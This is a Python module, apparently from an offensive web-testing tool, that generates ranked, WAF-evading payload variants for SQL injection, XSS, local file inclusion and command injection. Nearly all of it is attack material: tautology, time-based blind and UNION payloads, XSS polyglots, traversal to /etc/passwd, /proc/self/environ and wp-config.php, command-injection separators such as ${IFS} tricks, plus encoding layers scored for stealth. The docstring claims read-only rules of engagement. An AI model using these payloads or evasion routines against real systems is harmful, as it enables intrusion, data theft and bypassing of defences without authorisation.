"""Semantic-equivalence mutation engine.

A base payload like `' OR 1=1-- ` has thousands of equivalent forms
that preserve semantics but break WAF pattern-matching. This module
exposes one function per bug class:

    sqli_variants(base_payload)   -> Iterator[str]
    xss_variants(base_payload)    -> Iterator[str]
    lfi_variants(base_path)       -> Iterator[str]
    rce_variants(base_command)    -> Iterator[str]

Each yields a ranked stream of variants, most-stealthy first. The
ranking uses a simple heuristic — variants that combine multiple
evasion layers rank higher because they're more likely to slip a
layered WAF.

This module does NOT fire requests. It produces candidate payload
strings; the caller (statistical.py, precision orchestrator) picks
which to actually send against a target.

Rules of engagement
-------------------
We never produce a payload that DELETES data or DROPS tables. The
SQLi variants are all READ-only or time-based-blind. Upload/RCE
variants are inert-content (see argos/precision/payload_synth.py).
"""

from __future__ import annotations

import itertools
import random
from typing import Iterator, List, Optional

from amoskys.agents.Web.argos.evasion import encode

# ── SQL injection variants ────────────────────────────────────────


_SQLI_TAUTOLOGIES = (
    "' OR 1=1-- -",
    "' OR '1'='1",
    "' OR 'a'='a'-- -",
    "') OR (1=1)-- -",
    '" OR 1=1-- -',
    "' OR 1 LIKE 1-- -",
    "' OR true-- -",
    "')) OR ((1=1-- -",
)

_SQLI_TIMING = (
    "' AND SLEEP(4)-- -",
    "' AND IF(1=1,SLEEP(4),0)-- -",
    "' OR BENCHMARK(5000000,MD5(1))-- -",
    "' AND (SELECT SLEEP(4))-- -",
    "'; WAITFOR DELAY '0:0:4'-- -",  # MSSQL
    "' AND pg_sleep(4)-- -",  # Postgres
    "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)-- -",  # div-by-zero blind
)

_SQLI_UNION = (
    "' UNION SELECT NULL-- -",
    "' UNION ALL SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT user(),version(),database()-- -",
)


def _rank(variant: str) -> int:
    """Higher score = more stealth-likely.

    Reward: comment usage, hex encoding, case mutation, url2 double-enc.
    """
    score = 0
    if "/*" in variant:
        score += 3
    if "%25" in variant:
        score += 3
    if "%u" in variant:
        score += 2
    if "%00" in variant:
        score += 1
    alpha = [c for c in variant if c.isalpha()]
    if alpha and not (
        all(c.isupper() for c in alpha) or all(c.islower() for c in alpha)
    ):
        score += 2  # mixed case
    # Penalize variants that contain obvious red-flag literals.
    for red in ("OR 1=1", "' OR '1'='1", "UNION SELECT"):
        if red in variant:
            score -= 2
    return score


def sqli_variants(
    base: Optional[str] = None,
    mode: str = "timing",
    max_variants: int = 60,
    seed: Optional[int] = None,
) -> List[str]:
    """Produce ranked SQLi payload variants.

    mode: "timing" (blind), "tautology", "union", or "all".
    """
    rng = random.Random(seed) if seed is not None else random.Random()
    bases: List[str] = []
    if base:
        bases.append(base)
    else:
        if mode in ("timing", "all"):
            bases.extend(_SQLI_TIMING)
        if mode in ("tautology", "all"):
            bases.extend(_SQLI_TAUTOLOGIES)
        if mode in ("union", "all"):
            bases.extend(_SQLI_UNION)

    out: set = set()
    for b in bases:
        out.add(b)
        # Layer 1 — light: single encoding.
        out.add(encode.url(b))
        out.add(encode.case_mutate(b, rng=rng))
        # Layer 2 — whitespace + comment.
        out.add(encode.whitespace_mutate(b, rng=rng))
        out.add(encode.comment_pad(b))
        out.add(encode.sql_keyword_obfuscate(b))
        # Layer 3 — combined.
        out.add(encode.url(encode.case_mutate(b, rng=rng)))
        out.add(encode.url(encode.sql_keyword_obfuscate(b)))
        out.add(encode.url2(b))
        # Layer 4 — overlong single-quote.
        if "'" in b:
            out.add(b.replace("'", "%C0%A7"))  # overlong UTF-8 for '
        # Layer 5 — comment + sql-keyword combo.
        out.add(encode.sql_keyword_obfuscate(encode.whitespace_mutate(b, rng=rng)))

    ranked = sorted(out, key=_rank, reverse=True)
    return ranked[:max_variants]


# ── XSS variants ──────────────────────────────────────────────────


_XSS_BASE = (
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    # Polyglot:
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1))//"
    "</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
)


def xss_variants(
    base: Optional[str] = None, max_variants: int = 50, seed: Optional[int] = None
) -> List[str]:
    rng = random.Random(seed) if seed is not None else random.Random()
    bases: List[str] = [base] if base else list(_XSS_BASE)
    out: set = set()
    for b in bases:
        out.add(b)
        # URL-encoded.
        out.add(encode.url(b))
        out.add(encode.url2(b))
        # HTML-entity for the angle brackets.
        out.add(b.replace("<", "&lt;").replace(">", "&gt;"))
        out.add(encode.html_entity(b))
        out.add(encode.html_entity_hex(b))
        # Case mutate.
        out.add(encode.case_mutate(b, rng=rng))
        # Whitespace in tag: "<img onerror=alert(1) />" has event in
        # various spacing.
        if "onerror" in b.lower():
            out.add(b.replace("onerror=", "ONERROR\t="))
        if "onload" in b.lower():
            out.add(b.replace("onload=", "ONLOAD\n="))
        # URL-encode just the parens + quotes (partial evasion).
        partial = b.replace("(", "%28").replace(")", "%29").replace('"', "%22")
        out.add(partial)

    ranked = sorted(out, key=_rank, reverse=True)
    return ranked[:max_variants]


# ── LFI / path-traversal variants ────────────────────────────────


_LFI_BASE = (
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=wp-config.php",
    "file:///etc/passwd",
    "expect://id",
)


def lfi_variants(
    base: Optional[str] = None, depth: int = 6, max_variants: int = 50
) -> List[str]:
    bases: List[str] = [base] if base else list(_LFI_BASE)
    traversal = "../" * depth
    out: set = set()
    for b in bases:
        out.add(b)
        if "etc/passwd" in b or "windows" in b.lower():
            # Add traversal variants.
            tail = b.split("/../")[-1] if "../" in b else b.lstrip("/")
            out.add(traversal + tail.lstrip("/"))
        # URL-encoded.
        out.add(encode.url(b))
        # Double-URL encoded dots: %2e%2e/ → %252e%252e%2f
        out.add(b.replace("../", "%252e%252e%2f"))
        # UTF-8 overlong dots: %c0%ae%c0%ae/
        out.add(b.replace("../", "%c0%ae%c0%ae%2f"))
        # Null-byte truncation (PHP < 5.3.4).
        if "etc/passwd" in b or "wp-config.php" in b:
            out.add(b + "%00.jpg")
            out.add(b + "%00.png")
        # Slash alternatives.
        out.add(b.replace("../", "..%2f"))
        out.add(b.replace("../", "..%5c"))
        # Double-slash.
        out.add(b.replace("/", "//"))
    return sorted(out, key=_rank, reverse=True)[:max_variants]


# ── Command-injection variants ───────────────────────────────────


_RCE_BASE = (
    ";id",
    "|id",
    "&&id",
    "||id",
    "`id`",
    "$(id)",
    "\nid\n",
    ";sleep 4",
    "|sleep 4",
    "${IFS}sleep${IFS}4",  # bash $IFS trick
)


def rce_variants(base: Optional[str] = None, max_variants: int = 40) -> List[str]:
    bases: List[str] = [base] if base else list(_RCE_BASE)
    out: set = set()
    for b in bases:
        out.add(b)
        # URL-encoded.
        out.add(encode.url(b))
        out.add(encode.url2(b))
        # Newline as separator.
        if ";" in b:
            out.add(b.replace(";", "%0a"))
            out.add(b.replace(";", "%0d%0a"))
        # Backtick alternatives.
        if "`" in b:
            out.add(b.replace("`", "%60"))
        # $IFS trick for arg-list separation.
        if "sleep" in b.lower() and " " in b:
            out.add(b.replace(" ", "${IFS}"))
            out.add(b.replace(" ", "${IFS}$9"))
    return sorted(out, key=_rank, reverse=True)[:max_variants]


# ── Iterator (useful for streaming into WAF bypass scanners) ─────


def variant_stream(kind: str, **kw) -> Iterator[str]:
    """Yield variants lazily by bug class. Useful when a caller wants
    to stop early (e.g., first variant that gets a 200 response)."""
    fns = {
        "sqli": sqli_variants,
        "xss": xss_variants,
        "lfi": lfi_variants,
        "rce": rce_variants,
    }
    fn = fns.get(kind)
    if not fn:
        return iter([])
    for v in fn(**kw):
        yield v
